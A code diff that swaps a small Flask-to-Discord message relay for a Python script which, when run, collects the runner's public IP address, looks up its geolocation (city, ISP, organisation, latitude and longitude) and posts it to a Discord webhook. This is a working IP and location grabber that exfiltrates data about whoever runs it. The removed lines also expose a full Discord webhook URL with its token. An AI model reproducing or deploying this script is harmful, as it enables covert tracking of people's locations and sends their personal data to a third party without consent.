@@ -1,19 +1,32 @@
-from flask import Flask, request, jsonify
 import requests
+import json
+from dhooks import Webhook, Embed
+from datetime import datetime
 
-app = Flask(__name__)
-WEBHOOK_URL = "https://discord.com/api/webhooks/1390721110567551036/6mFcNlUthjNZ4FNu9NHIirGFPZykYlepUT3xN3wIGhoy_IUiAck0EePUaslhO6yYy07I"
+hook = Webhook("webhook-url-here")
 
-@app.route('/send', methods=['POST'])
-def send():
-    data = request.get_json()
-    content = data.get("content", "Brak treści")
-    r = requests.post(WEBHOOK_URL, json={"content": content})
-    return jsonify({"status": "OK", "discord_status": r.status_code})
+time = datetime.now().strftime("%H:%M %p")  
+ip = requests.get('https://api.ipify.org/').text
 
-@app.route('/')
-def home():
-    return "Bot działa! Wyślij POST na /send"
-
-if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=10000)
+r = requests.get(f'http://extreme-ip-lookup.com/json/{ip}')
+geo = r.json()
+embed = Embed()
+fields = [
+    {'name': 'IP', 'value': geo['query']},
+    {'name': 'ipType', 'value': geo['ipType']},
+    {'name': 'Country', 'value': geo['country']},
+    {'name': 'City', 'value': geo['city']},
+    {'name': 'Continent', 'value': geo['continent']},
+    {'name': 'Country', 'value': geo['country']},
+    {'name': 'IPName', 'value': geo['ipName']},
+    {'name': 'ISP', 'value': geo['isp']},
+    {'name': 'Latitute', 'value': geo['lat']},
+    {'name': 'Longitude', 'value': geo['lon']},
+    {'name': 'Org', 'value': geo['org']},
+    {'name': 'Region', 'value': geo['region']},
+    {'name': 'Status', 'value': geo['status']},
+]
+for field in fields:
+    if field['value']:
+        embed.add_field(name=field['name'], value=field['value'], inline=True)
+hook.send(embed=embed)
